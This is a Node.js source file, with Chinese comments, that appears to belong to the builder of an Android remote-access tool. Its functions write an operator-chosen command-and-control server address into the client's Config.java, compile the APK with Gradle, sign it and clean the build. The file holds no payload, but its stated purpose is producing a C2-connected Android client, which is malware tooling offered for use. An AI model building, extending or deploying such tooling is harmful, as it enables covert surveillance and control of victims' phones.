const
    cp = require('child_process'),
    fs = require('fs'),
    path = require('path'),
    CONST = require('./const');

/**
 * 检查Java是否已安装
 */
function checkJava(callback) {
    let spawn = cp.spawn('java', ['-version']);
    spawn.on('error', (err) => callback("Java未安装", null));
    spawn.stderr.on('data', (data) => {
        spawn.removeAllListeners();
        spawn.stderr.removeAllListeners();
        return callback(null, "Java已安装");
    });
}

/**
 * 修改Config.java中的C2服务器地址
 * @param {string} URI - 服务器地址
 * @param {string} PORT - 服务器端口
 * @param {function} cb - 回调函数
 */
function patchConfig(URI, PORT, cb) {
    fs.readFile(CONST.configFilePath, 'utf8', function (err, data) {
        if (err) return cb('读取Config.java失败: ' + err.message);
        
        // 构建新的服务器URL
        const serverUrl = `http://${URI}:${PORT}`;
        
        // 替换C2_SERVER的值
        // 匹配 public static String C2_SERVER = "...";
        const pattern = /public static String C2_SERVER\s*=\s*"[^"]*";/;
        const replacement = `public static String C2_SERVER = "${serverUrl}";`;
        
        if (!pattern.test(data)) {
            return cb('Config.java中未找到C2_SERVER定义');
        }
        
        const result = data.replace(pattern, replacement);
        
        fs.writeFile(CONST.configFilePath, result, 'utf8', function (err) {
            if (err) return cb('写入Config.java失败: ' + err.message);
            return cb(false);
        });
    });
}

/**
 * 使用Gradle构建Release APK
 * @param {function} cb - 回调函数
 */
function buildAPK(cb) {
    checkJava(function (err) {
        if (err) return cb(err);
        
        const options = {
            cwd: CONST.clientPath,
            timeout: 300000 // 5分钟超时
        };
        
        // 执行Gradle构建
        cp.exec(CONST.buildCommand, options, (error, stdout, stderr) => {
            if (error) {
                console.log('Gradle构建输出:', stdout);
                console.log('Gradle构建错误:', stderr);
                return cb('Gradle构建失败: ' + error.message);
            }
            
            console.log('Gradle构建成功');
            
            // 检查未签名APK是否存在
            if (!fs.existsSync(CONST.apkUnsignedPath)) {
                return cb('未找到构建的APK文件: ' + CONST.apkUnsignedPath);
            }
            
            // 签名APK
            cp.exec(CONST.signCommand, (signError, signStdout, signStderr) => {
                if (signError) {
                    console.log('签名输出:', signStdout);
                    console.log('签名错误:', signStderr);
                    return cb('APK签名失败: ' + signError.message);
                }
                
                // 重命名签名后的APK
                const signedApkPath = path.join(CONST.apkOutputPath, 'app-release-aligned-signed.apk');
                const finalPath = CONST.apkSignedBuildPath;
                
                if (fs.existsSync(signedApkPath)) {
                    fs.renameSync(signedApkPath, finalPath);
                }
                
                return cb(false);
            });
        });
    });
}

/**
 * 清理构建缓存
 */
function cleanBuild(cb) {
    const options = {
        cwd: CONST.clientPath,
        timeout: 60000
    };
    
    cp.exec(`${CONST.gradlePath} clean`, options, (error) => {
        if (error) return cb('清理失败: ' + error.message);
        return cb(false);
    });
}

module.exports = {
    buildAPK,
    patchConfig,
    cleanBuild,
    // 保持向后兼容
    patchAPK: patchConfig
};
